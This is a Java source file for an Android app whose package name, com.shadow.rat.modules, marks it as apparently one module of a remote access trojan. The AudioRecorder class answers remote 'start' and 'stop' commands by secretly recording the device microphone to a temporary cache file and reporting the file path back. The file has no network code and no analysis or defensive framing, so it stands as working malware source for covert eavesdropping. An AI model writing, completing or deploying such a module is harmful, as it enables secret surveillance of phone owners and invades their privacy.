package com.shadow.rat.modules;

import android.content.Context;
import android.media.MediaRecorder;
import java.io.File;
import java.io.IOException;

public class AudioRecorder implements Module {

    private final Context context;
    private MediaRecorder recorder;
    private String outputFile;
    private boolean isRecording = false;

    public AudioRecorder(Context context) {
        this.context = context;
    }

    @Override
    public String execute(String command) {
        if (command.equalsIgnoreCase("start")) {
            return startRecording();
        } else if (command.equalsIgnoreCase("stop")) {
            return stopRecording();
        }
        return "Unknown command for AudioRecorder. Available commands: start, stop";
    }

    private String startRecording() {
        if (isRecording) {
            return "Already recording.";
        }
        try {
            File outputDir = context.getCacheDir();
            File outputFile = File.createTempFile("audio_record", ".3gp", outputDir);
            this.outputFile = outputFile.getAbsolutePath();

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(this.outputFile);
            recorder.prepare();
            recorder.start();
            isRecording = true;
            return "Recording started. Output file: " + this.outputFile;
        } catch (IOException e) {
            e.printStackTrace();
            return "Failed to start recording: " + e.getMessage();
        }
    }

    private String stopRecording() {
        if (!isRecording) {
            return "Not recording.";
        }
        try {
            recorder.stop();
            recorder.release();
            recorder = null;
            isRecording = false;
            return "Recording stopped. File saved at: " + outputFile;
        } catch (Exception e) {
            e.printStackTrace();
            return "Failed to stop recording: " + e.getMessage();
        }
    }
}
